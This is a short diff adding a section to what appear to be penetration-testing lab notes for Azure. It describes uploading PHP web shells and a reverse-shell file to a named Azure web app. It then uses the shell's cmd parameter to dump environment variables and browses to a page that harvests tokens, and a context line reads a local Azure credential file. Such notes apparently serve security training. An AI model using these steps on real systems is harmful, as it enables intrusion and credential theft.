@@ -561,6 +561,28 @@ cat C:\Users\studentuserx\.Azure\AzureRmContext.json
 
 
 
+# Web Application File Upload
+
+Files:
+- studentxshell.phtml
+- studentxtoken.phtml
+- RevShell_phtml.phtml
+
+Example upload:
+```
+https://defcorphqcareer.azurewebsites.net/
+https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
+```
+
+append:
+```
+/uploads/studentxshell.phtml?cmd=env
+```
+
+For tokens browse to:
+```
+/uploads/studentxtoken.phtml
+```
 
 
 
